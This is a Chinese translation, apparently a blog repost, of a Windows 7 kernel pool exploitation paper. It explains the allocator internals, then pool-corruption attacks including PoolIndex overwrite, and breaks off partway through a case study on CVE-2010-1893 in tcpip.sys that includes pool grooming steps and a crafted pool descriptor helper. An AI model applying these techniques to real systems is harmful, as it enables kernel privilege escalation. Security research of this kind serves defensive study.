<p>如果不能使用lookaside表，则使用分配位图来获取所请求的池页面。 位图（在RTL BITMAP中定义）是一个位数组，指示哪些内存页面正在使用，并为每个主要池类型创建。它将搜索保存所请求的未使用页数的第一个索引。对于分页池 ，位图在MM PAGED POOL INFO结构中定义，由nt!MmPagedPoolInfo指向。对于非分页池，位图由nt!MiNonPagedPoolBitMap指向。对于会话池，位图在MM SESSION SPACE结构中定义。</p>
<p>对于大多数大型池分配，nt!ExAllocatePoolWithTag将请求一个额外的4个字节（x64上的8个）以将分配大小存储在池主体的末尾。 随后在分配器被释放时（在ExFreePoolWithTag中）检查该值来捕获可能的池溢出。</p>
<h3 id="分配算法"><a href="#分配算法" class="headerlink" title="分配算法"></a>分配算法</h3><p>为了分配池内存，内核模块和第三方驱动程序调用ExAllocatePoolWithTag（或其任何包装函数），由执行内核导出。此函数将首先尝试使用lookaside表，然后是ListHeads列表，如果没有返回池块，则从池页面分配程序请求一个页。以下伪代码大致概述了其实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">PVOID</div><div class="line">ExAllocatePoolWithTag( POOL_TYPE PoolType,</div><div class="line">SIZE_T NumberOfBytes,</div><div class="line">ULONG Tag)</div><div class="line">// call pool page allocator if size is above 4080 bytes</div><div class="line">if (NumberOfBytes &gt; 0xff0) &#123;</div><div class="line">// call nt!ExpAllocateBigPool</div><div class="line">&#125;</div><div class="line">// attempt to use lookaside lists</div><div class="line">if (PoolType &amp; PagedPool) &#123;</div><div class="line">if (PoolType &amp; SessionPool &amp;&amp; BlockSize &lt;= 0x19) &#123;</div><div class="line">// try the session paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else if (BlockSize &lt;= 0x20) &#123;</div><div class="line">// try the per-processor paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">// lock paged pool descriptor (round robin or local node)</div><div class="line">&#125;</div><div class="line">else &#123; // NonPagedPool</div><div class="line">if (BlockSize &lt;= 0x20) &#123;</div><div class="line">// try the per-processor non-paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">// lock non-paged pool descriptor (local node)</div><div class="line">&#125;</div><div class="line">// attempt to use listheads lists</div><div class="line">for (n = BlockSize-1; n &lt; 512; n++) &#123;</div><div class="line">if (ListHeads[n].Flink == &amp;ListHeads[n]) &#123; // empty</div><div class="line">continue; // try next block size</div><div class="line">&#125;</div><div class="line">// safe unlink ListHeads[n].Flink</div><div class="line">// split if larger than needed</div><div class="line">// return chunk</div><div class="line">&#125;</div><div class="line">// no chunk found, call nt!MiAllocatePoolPages</div><div class="line">// split page and return chunk</div></pre></td></tr></table></figure></p>
<p>如果从ListHeads[n]列表中返回大于所请求大小的块，则该块被拆分。 为了减少碎片，分配器返回的超大块部分取决于其相对页位置。如果块是页面对齐的，则从块的前面分配所请求的大小。如果块不是页对齐，则从块的后面分配所请求的大小。无论哪种方式，拆分块的剩余（未使用）片段都放在适当的ListHeads列表的尾部。</p>
<h3 id="释放算法"><a href="#释放算法" class="headerlink" title="释放算法"></a>释放算法</h3><p>ExFreePoolWithTag实现的释放算法检查池要释放的块的头部，并将其释放到适当的列表。 为了<br>为了减少碎片，它也试图合并周围的空闲块。以下伪代码显示了算法的工作原理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">ExFreePoolWithTag( PVOID Entry,</div><div class="line">ULONG Tag)</div><div class="line">if (PAGE_ALIGNED(Entry)) &#123;</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">if (Entry-&gt;BlockSize != NextEntry-&gt;PreviousSize)</div><div class="line">BugCheckEx(BAD_POOL_HEADER);</div><div class="line">if (Entry-&gt;PoolType &amp; SessionPagedPool &amp;&amp; Entry-&gt;BlockSize &lt;= 0x19) &#123;</div><div class="line">// put in session pool lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else if (Entry-&gt;BlockSize &lt;= 0x20) &#123;</div><div class="line">if (Entry-&gt;PoolType &amp; PagedPool) &#123;</div><div class="line">// put in per-processor paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else &#123; // NonPagedPool</div><div class="line">// put in per-processor non-paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if (ExpPoolFlags &amp; DELAY_FREE) &#123; // 0x200</div><div class="line">if (PendingFreeDepth &gt;= 0x20) &#123;</div><div class="line">// call nt!ExDeferredFreePool</div><div class="line">&#125;</div><div class="line">// add Entry to PendingFrees list</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">if (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;</div><div class="line">// safe unlink next entry</div><div class="line">// merge next with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FREE(PreviousEntry)) &#123;</div><div class="line">// safe unlink previous entry</div><div class="line">// merge previous with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FULL_PAGE(Entry))</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">else &#123;</div><div class="line">// insert Entry to ListHeads[BlockSize - 1]</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>DELAY FREE池标志（nt！ExpPoolFlags＆0x200）可实现性能优化，可以同时释放多个池分配以摊销池获取和释放。此机制在[11]中简要提及，如果可用物理页面数（nt！MmNumberOfPhysicalPages）大于或等于0x1fc00.5，则Windows XP SP2或更高版本启用。使用时每次新的ExFreePoolWithTag调用将该块附加到被释放到每个池描述符的PendingFrees列表中。如果列表包含32个或更多的块（由PendingFreeDepth确定），则在对ExDeferredFreePool的调用中处理。 此函数遍历每个条目并将其释放到相应的ListHeads列表，如以下伪代码所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">ExDeferredFreePool( PPOOL_DESCRIPTOR PoolDesc,</div><div class="line">BOOLEAN bMultipleThreads)</div><div class="line">for each (Entry in PendingFrees) &#123;</div><div class="line">if (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;</div><div class="line">// safe unlink next entry</div><div class="line">// merge next with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FREE(PreviousEntry)) &#123;</div><div class="line">// safe unlink previous entry</div><div class="line">// merge previous with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FULL_PAGE(Entry))</div><div class="line">// add to full page list</div><div class="line">else &#123;</div><div class="line">// insert Entry to ListHeads[BlockSize - 1]</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">for each (page in full page list) &#123;</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>释放到lookaside并且池描述符ListHeads总是放在合适的列表的前面。这个规则的例外是分列块的剩余片段，放在列表的尾部。 当内存管理器返回大于所请求大小的块（如第2.7节所述）时，块将被拆分，例如在ExpBigPoolAllocation中分割的完整页面和ExAllocatePoolWithTag中分割的ListHeads条目。为了尽可能频繁地使用CPU缓存，分配总是从最近使用的块，从适当的列表的前面。</p>
<h3 id="AMD64-x64内核池更改"><a href="#AMD64-x64内核池更改" class="headerlink" title="AMD64 / x64内核池更改"></a>AMD64 / x64内核池更改</h3><p>尽管支持更大的物理地址空间，x64 Windows不会对内核池引入任何重大更改。 但是，为了适应指针宽度的变化，块大小的粒度增加到16个字节，以BlockSize =（NumberOfBytes + 0x1F）&gt;&gt; 4计算。为了反映这一变化，相应地更新池头部。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_HEADER</div><div class="line">&#123;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">struct</div><div class="line">/*0x000*/ ULONG32 PreviousSize : 8;</div><div class="line">/*0x000*/ ULONG32 PoolIndex : 8;</div><div class="line">/*0x000*/ ULONG32 BlockSize : 8;</div><div class="line">/*0x000*/ ULONG32 PoolType : 8;</div><div class="line">&#125;;</div><div class="line">/*0x000*/ ULONG32 Ulong1;</div><div class="line">&#125;;</div><div class="line">/*0x004*/ ULONG32 PoolTag;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x008*/ struct _EPROCESS* ProcessBilled;</div><div class="line">struct</div><div class="line">&#123;</div><div class="line">/*0x008*/ UINT16 AllocatorBackTraceIndex;</div><div class="line">/*0x00A*/ UINT16 PoolTagHash;</div><div class="line">/*0x00C*/ UINT8 _PADDING0_[0x4];</div><div class="line">&#125;;</div><div class="line">&#125;;</div><div class="line">&#125; POOL_HEADER, *PPOOL_HEADER;</div></pre></td></tr></table></figure></p>
<p>由于块大小粒度的变化，PreviousSize和BlockSize都减少到8位。 因此，池描述符ListHeads持有256双向列表，而不是x86上的512。 这也允许一个额外的<br>位被分配给PoolIndex，因此256个节点（池描述符）可能是支持x64，x86上超过128个。此外，池头扩展为16字节，并且包括用于配额管理的ProcessBilled指针，以标识分配所收取的进程。 在x86上，该指针存储在池主体的最后四个字节中。 我们在3.5节讨论使用配额过程指针的攻击。</p>
<h2 id="内核池攻击"><a href="#内核池攻击" class="headerlink" title="内核池攻击"></a>内核池攻击</h2><p>在本节中，我们讨论了对Windows 7内核的几个实际攻击池。首先，在3.1节中，我们展示了对ListHeads池块的（un）安全unlinking中的LIST ENTRY结构进行了攻击。在第3.2节和第3.3节中，我们分别对单向lookaside链表和延迟的释放列表进行了攻击。在3.4节中我们提出了对被释放的分配块的池头的攻击。在第3.4节中，我们提出了对被释放的分配块的池头部的攻击，最后，在第3.5节中，我们显示了对配额充值池分配的攻击。</p>
<h3 id="ListEntry-Flink覆盖"><a href="#ListEntry-Flink覆盖" class="headerlink" title="ListEntry Flink覆盖"></a>ListEntry Flink覆盖</h3><p>为了解决对内核池溢出的通用利用，Windows 7<br>执行安全的unlinking以验证ListHeads列表中的池块的LIST ENTRY指针。然而，在从ListHeads [n]（给定块大小）中分配池块时，该算法验证了ListHeads [n]的LIST ENTRY结构，而不是实际块被unlinking的结构。因此，在空闲块中重写前向指针可能会导致将ListHeads [n]的地址写入攻击者控制的地址（图1）。</p>
<p><img src="/img/图一.png" alt="image"></p>
<p>此攻击需要至少两个空闲块存在于目标ListHeads [n]列表中。 否则，ListHeads [n] .Blink将验证unlinked的块的前向指针。在示例1中，ListHeads列表中的池块的前向指针已被攻击者选择的地址破坏。 反过来，当这个块在ExAllocatePoolWithTag中分配时，算法尝试在攻击者控制的地址（eax）处在LIST ENTRY结构的后向指针上写入ListHeads[n]（esi）的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">eax=80808080 ebx=829848c0 ecx=8cc15768 edx=8cc43298 esi=82984a18 edi=[..]</div><div class="line">eip=8296f067 esp=82974c00 ebp=82974c48 iopl=0 nv up ei pl zr na pe nc</div><div class="line">cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010246</div><div class="line">nt!ExAllocatePoolWithTag+0x4b7:</div><div class="line">8296f067 897004 mov dword ptr [eax+4],esi ds:0023:80808084=????????</div></pre></td></tr></table></figure>
<p><strong>Example 1: ListEntry Flink overwrite</strong></p>
<p>虽然不能从用户模式上下文中确定esi的值，但有时可以推断出它的值。例如，如果仅定义了一个非分页池（如2.2所述），则esi将指向ntoskrnl数据段中的固定位置（nt!NonPagedPoolDescriptor）。 如果池描述符是从内存中分配的，那么可以从其定义的池内存范围中假设它的下落。 因此，攻击者可以覆盖重要的全局变量[14]或内核对象指针[6]（例如通过部分指针重写），以便获得任意代码执行。</p>
<p>攻击者还可以使用覆盖中的用户模式指针将任意写入扩展到完全受控的内核分配。 这是因为在unlinking已损坏块之后，ListHeads [n] .Flink被更新为指向下一个空闲块（攻击者控制的指针）。 因为攻击者提供的地址的后向指针被更新以指向ListHeads [n]，所以池分配器在将从空闲列表的usermode指针安全地unlinking中没有问题。</p>
<h3 id="Lookaside-Next指针覆盖"><a href="#Lookaside-Next指针覆盖" class="headerlink" title="Lookaside Next指针覆盖"></a>Lookaside Next指针覆盖</h3><p>lookaside为快速和轻量化而设计，因此不会引入与双向链接ListHeads列表相同的一致性检查。 作为单向链接，lookaside列表中的每个条目都保存指向下一个条目的指针。 由于没有任何检查证明这些指针的有效性，攻击者可能会使用池损坏漏洞强制池分配器返回任意地址以检索下一个空闲的lookaside块。 反过来，这可能会让攻击者破坏任意的内核内存。</p>
<p><img src="/img/图二.png" alt="image"></p>
<p>如第2.5节所述，内存管理器对池块和池页面使用lookaside表。 对于lookaside池块，Next指针直接跟随8字节池头（POOL HEADER）。因此，覆盖Next指针最多需要x86上的12字节溢出。 为了将池块释放到lookaside表中，必须满足以下条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">– BlockSize &lt;= 0x20 for (paged/non-paged) pool chunks</div><div class="line">– BlockSize &lt;= 0x19 for paged session pool chunks</div><div class="line">– Lookaside list for target BlockSize is not full</div><div class="line">– Hot/cold page separation is not used (ExpPoolFlags &amp; 0x100)</div></pre></td></tr></table></figure></p>
<p>为了将lookaside指针损坏扩展为n字节任意内存覆盖，必须先分配目标块大小，直到返回损坏的指针（图2）。 此外，必须在一定程度上控制所分配的块的内容，以便影响用于覆盖的数据。 对于分页池分配，分配unicode字符串（如NtCreateSymbolicLinkObject）的本机API提供了一种方便的方式来填充几乎任何字节组合的任何大小的块。 这样的API也可以用于碎片整理和操纵池内存布局，以控制诸如未初始化的指针和双重释放的可利用的图元。</p>
<p><img src="/img/图三.png" alt="image"></p>
<p>与lookaside池块不同，lookaside池页（图3）将Next指针存储在offset null，因为没有与其相关联的池头。如果保持以下条件，分配的池页将被释放到lookaside表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NumberOfPages = 1 for paged pool pages</div><div class="line">– NumberOfPages &lt;= 3 for non-paged pool pages</div><div class="line">– Lookaside list for target page count is not full</div></pre></td></tr></table></figure></p>
<p>只要内存管理器必须要求额外的池内存，不能从ListHeads或lookaside表中获取，则由nt!MiAllocatePoolPages返回池页面。由于这通常由许多并发系统线程执行，因此操作内核池布局以将溢出位于旁边在llokaside中的空闲池页面旁边显然比完成更容易。 另一方面，当使用lookaside池块时，可以使用不经常请求的块大小值，以便对存储器布局进行更细粒度的控制。这可以通过检查后备管理结构中的TotalAllocates值来完成。</p>
<h3 id="PendingFrees-Next指针覆盖"><a href="#PendingFrees-Next指针覆盖" class="headerlink" title="PendingFrees Next指针覆盖"></a>PendingFrees Next指针覆盖</h3><p>从第2.8节回顾，等待被释放的池条目存储在单向链接的PendingFrees列表中。 由于在遍历这些列表中未执行任何检查，攻击者可能会利用池损坏漏洞来破坏PendingFrees列表条目的Next指针。反过来，这将允许攻击者释放一个任意地址到一个选择的池描述符ListHeads列表和可能控制后续池分配的内存（图4）。</p>
<p><img src="/img/图四.png" alt="image"></p>
<p>攻击延迟空闲列表的一个值得注意的注意事项是内核池很频繁地处理这个列表（每32次是释放一次）。 事实上，数百个线程可以安排在同一个内核池中，并且还可以在多核机器上并行处理6。 因此，很可能已经从缓冲区溢出中定位的块已经从延迟释放列表中删除并放置在ListHeads列表中。 因此，我们几乎不能认为这种攻击是实际的。然而，由于某些池描述符的使用频率低于其他池（如会话池描述符），所以在某些情况下对延迟释放列表的攻击也许是可行的。</p>
<h3 id="PoolIndex覆盖"><a href="#PoolIndex覆盖" class="headerlink" title="PoolIndex覆盖"></a>PoolIndex覆盖</h3><p>如果给池类型定义了多个池描述符，则池块的PoolIndex表示关联的池描述符数组的索引。 因此，在使用ListHeads条目时，池块总是被释放到其适当的池描述符。 然而，由于验证不足，一个格式不正确的PoolIndex可能会触发一个数组越界，从而允许攻击者覆盖任意的内核内存。</p>
<p><img src="/img/图五.png" alt="image"></p>
<p>对于分页池，PoolIndex始终表示分页池描述符数组（nt！ExpPagedPoolDescriptor）中的索引。 在检查的构建中，索引值在与nt！ExpNumberOfPagedPools的比较中进行验证，以防止任何数组越界访问。 然而，在空闲（retail）构建中，索引未被验证。 对于非分页池，PoolIndex仅在NUMA感知系统中存在多个节点时才表示nt！ExpNonPagedPoolDescriptor中的索引。再次，在空闲构建中，PoolIndex未被验证。</p>
<p>一个格式不正确的PoolIndex（只需要一个2字节的池溢出）可能会使分配的池块被释放到空指针池描述符（图5）。 通过映射虚拟空页，攻击者可以完全控制池描述符及其ListHeads条目。 反过来，这可能允许攻击者在链接到列表时将池块的地址写入任意地址。 这是因为当前在前面的块的Blink被更新为释放的块的地址，这样ListHeads [n] .Flink-&gt; Blink = FreedChunk。 值得注意的是，由于释放的块没有返回到任何真实的池描述符，所以不需要清理（删除stale条目等）内核池。</p>
<p><img src="/img/图六.png" alt="image"></p>
<p>如果启用延迟池释放（如第2.8节所述），则可以通过创建伪造的PendingFrees列表来实现类似的效果（图6）。 在这种情况下，列表中的第一个条目将指向攻击者控制的地址。 此外，池描述符中的PendingFreeDepth的值将大于或等于0x20以触发PendingFrees列表的处理。<br>示例2演示了PoolIndex覆盖如何可能导致将用户控制的页面地址（eax）写入任意目标地址（esi）。 为了执行任意代码，攻击者可以利用该方法用用户模式页面地址覆盖不经常使用的内核函数指针，并从相同的进程上下文触发其执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">eax=20000008 ebx=000001ff ecx=000001ff edx=00000538 esi=80808080 edi=[..]</div><div class="line">eip=8293c943 esp=9c05fb20 ebp=9c05fb58 iopl=0 nv up ei pl nz na po nc</div><div class="line">cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010202</div><div class="line">nt!ExDeferredFreePool+0x2e3:</div><div class="line">8293c943 894604 mov dword ptr [esi+4],eax ds:0023:80808084=????????</div></pre></td></tr></table></figure></p>
<p>Example 2: PoolIndex overwrite on delayed free</p>
<p>如果块的PoolType被覆盖（例如通过将其设置为PagedPool），则PoolIndex覆盖攻击可以应用于任何池类型。 由于这需要BlockSize也被覆盖，攻击者必须知道溢出块的大小或者创建一个嵌入其中的伪边界块。 这是必需的，因为FreedBlock-&gt; BlockSize = NextBlock-&gt; PreviousSize必须保持，由释放算法检查。 另外，块大小应该大于0x20以避免lookaside表（忽略PoolIndex）。 但是请注意，嵌入式池块可能会潜在地破坏块数据中的重要字段或指针。</p>
<h3 id="配额进程指针覆盖"><a href="#配额进程指针覆盖" class="headerlink" title="配额进程指针覆盖"></a>配额进程指针覆盖</h3><p>由于可以为分配的池内存收取进程，池分配必须为池算法提供足够的信息，以将收取的配额返回到正确的进程。 因此，池块可以可选地存储指向关联的进程对象的指针。 在x64上，过程对象指针存储在池头的最后八个字节中，如第2.9节所述，而在x86上，指针被附加到池主体。 在池损坏漏洞中覆盖此指针（图7）可能允许攻击者在返回带电配额时释放使用中的进程对象或损坏任意内存。</p>
<p><img src="/img/图七.png" alt="image"></p>
<p>每当池分配器被释放时，释放算法在实际将内存返回到适当的空闲列表或lookaside表之前检查配额位（0x8）的池类型。 如果该位被置位，它将尝试通过调用nt！PspReturnQuota返回带电量的配额，然后取消引用关联的进程对象。 因此，覆盖过程对象指针可能允许攻击者减少任意进程对象的引用（指针）计数。 如果满足正确的条件（例如当引用计数降低到零时，句柄计数为零，则引用计数不一致性可能导致释放后使用）。</p>
<p><img src="/img/图八.png" alt="image"></p>
<p>如果进程对象指针被替换为指向用户模式内存的指针，则攻击者可以创建一个假的EPROCESS对象来控制指向EPROCESS QUOTA BLOCK结构（图8）的指针，其中存储了配额信息。 在空闲时，通过减去分配的大小来更新指示在该结构中使用的配额的值。 因此，攻击者可以在收取指定的配额后，减少任意地址的值。 只要配置位和配额过程对象指针都被设置，攻击者就可以对任何池分配进行两次攻击。</p>
<h2 id="案例研究：CVE-2010-1893"><a href="#案例研究：CVE-2010-1893" class="headerlink" title="案例研究：CVE-2010-1893"></a>案例研究：CVE-2010-1893</h2><p>在本节中，我们应用3.4节中描述的PoolIndex覆盖技术，以利用MS10-058 [10]中提到的Windows TCP / IP内核模块（CVE-2010-1893）中的池溢出。所描述的攻击仅基于池管理结构，它不依赖于任何涉及的池块中保存的数据。</p>
<h3 id="关于漏洞"><a href="#关于漏洞" class="headerlink" title="关于漏洞"></a>关于漏洞</h3><p>Windows TCP / IP内核模块或tcpip.sys实现了几个功能用于控制插座的模式。 这些功能大部分可以通过调用WSAIoctl并提供所需操作的I/O控制代码从用户模式访问。在指定SIO ADDRESS LIST SORT ioctl时，tcpip.sys调用IppSortDestinationAddresses（）对IPv6和IPv4目标地址的列表进行排序，以确定建立连接的最佳可用地址。该函数发现易受攻击[17]到整数溢出 Windows 7 / Windows 2008 R2和Windows Vista / Windows 2008，因为它一直不使用安全的整数函数。因此，为地址列表指定大量地址可能会导致缓冲区分配不足，导致IppFlattenAddressList（）中的池溢出。</p>
<h3 id="准备池内存"><a href="#准备池内存" class="headerlink" title="准备池内存"></a>准备池内存</h3><p>内核池利用的一个重要方面是能够始终覆盖所需的内存。 由于内核池的分段状态使分配的位置不可预测，攻击者必须首先使用内核对象或其他可控内存分配对内核池进行碎片整理。 在这方面的目标是分配所有的空闲块，以使池分配器返回一个新的页面。 填充新分配的具有相同大小的分配的页面并释放每秒的分配允许攻击者为易受攻击的缓冲区创建漏洞。 这将使攻击者能够溢出用于填充内核池的对象或内存分配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">kd&gt; !pool @eax</div><div class="line">Pool page 976e34c8 region is Nonpaged pool</div><div class="line">976e32e0 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3340 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e33a0 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3400 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e3460 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">*976e34c0 size: 60 previous size: 60 (Allocated) *Ipas</div><div class="line">Pooltag Ipas : IP Buffers for Address Sort, Binary : tcpip.sys</div><div class="line">976e3520 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3580 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e35e0 size: 60 previous size: 60 (Allocated) IoCo (Pr</div></pre></td></tr></table></figure></p>
<p>Example 3: Address sort buffer allocated in user fragmented pool</p>
<p>在示例3中，内核池已经填充了IoCompletionReserve对象（使用NtAllocateReserveObject [7]），其中每秒的分配随后被释放。 因此，当在IppSortDestinationAddresses（）中分配与释放的块的大小（三个SOCKADDR IN6条目）匹配的地址排序缓冲区时，可能会落入其中一个创建的孔中。</p>
<h3 id="使用PoolIndex覆盖"><a href="#使用PoolIndex覆盖" class="headerlink" title="使用PoolIndex覆盖"></a>使用PoolIndex覆盖</h3><p>为了利用PoolIndex攻击，攻击者必须溢出以下池块的池头，并将其PoolType设置为PagedPool | InUse（3），并将其PoolIndex设置为数组越界（例如大多数单个处理器上的5个 系统），如示例4所示。这将导致在释放损坏的池块时引用空指针池描述符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt nt!_POOL_HEADER 976e3520</div><div class="line">+0x000 PreviousSize : 0y000001100 (0xc)</div><div class="line">+0x000 PoolIndex : 0y0000101 (0x5) &lt;-- out-of-bounds index</div><div class="line">+0x002 BlockSize : 0y000001100 (0xc)</div><div class="line">+0x002 PoolType : 0y0000011 (0x3) &lt;-- PagedPool|InUse</div><div class="line">+0x000 Ulong1 : 0x60c0a0c</div><div class="line">+0x004 PoolTag : 0xef436f49</div><div class="line">+0x004 AllocatorBackTraceIndex : 0x6f49</div><div class="line">+0x006 PoolTagHash : 0xef43</div></pre></td></tr></table></figure></p>
<p>Example 4: Pool header after overflow - corrupting PoolIndex</p>
<p>在LIST1的函数中，我们初始化必要的池描述符值来执行攻击。 在此功能中，PoolAddress指向用户控制的池块（例如分配在用户模式页面上），WriteAddress设置写入PoolAddress指针的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">InitPoolDescriptor ( PPOOL_DESCRIPTOR PoolDescriptor ,</div><div class="line">PPOOL_HEADER PoolAddress ,</div><div class="line">PVOID WriteAddress )</div><div class="line">&#123;</div><div class="line">ULONG i ;</div><div class="line">RtlZeroMemory ( PoolDescriptor , sizeof ( POOL_DESCRIPTOR ) ) ;</div><div class="line">PoolDescriptor - &gt; PoolType = PagedPool ;</div><div class="line">PoolDescriptor - &gt; PagedLock . Count = 1;</div><div class="line">// create pending frees list</div><div class="line">PoolDescriptor - &gt; PendingFreeDepth = 0 x20 ;</div><div class="line">PoolDescriptor - &gt; PendingFrees = ( VOID **) ( PoolAddress +1) ;</div><div class="line">// create ListHeads entries with target address</div><div class="line">for ( i =0; i &lt;512; i ++) &#123;</div><div class="line">PoolDescriptor - &gt; ListHeads [ i ]. Flink = ( PCHAR )</div><div class="line">WriteAddress - sizeof ( PVOID ) ;</div><div class="line">PoolDescriptor - &gt; ListHeads [ i ]. Blink = ( PCHAR )</div><div class="line">WriteAddress - sizeof ( PVOID ) ;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Listing 1. Function initializing a crafted pool descriptor</p>
<p>我们假设要使用的挂起的空闲列表大多数系统具有512MB或更多RAM。 因此，用户控制的池块的地址最终将被写入到WriteAddress指示的地址中，这可以用来覆盖内核函数指针，从而使exploitation细微。 如果未使用挂起的空闲列表，则释放的内核池块（内核地址）的地址将最终写入指定的地址，在这种情况下，需要其他方法，例如部分指针重写，以执行任意代码。</p>
<p>触发溢出之前的最后一个任务是初始化PoolAddress指向的内存区域，使得伪造池块（在挂起的空闲列表中）正确地返回到精心设计的ListHeads列表（触发任意写入）。 在LIST2的函数中，我们创建一个有两个边界池块的布局，PoolIndex再次将数组越界的索引引用到关联的池描述符数组中。 此外，BlockSize必须足够大，以避免使用lookaside列表。</p>
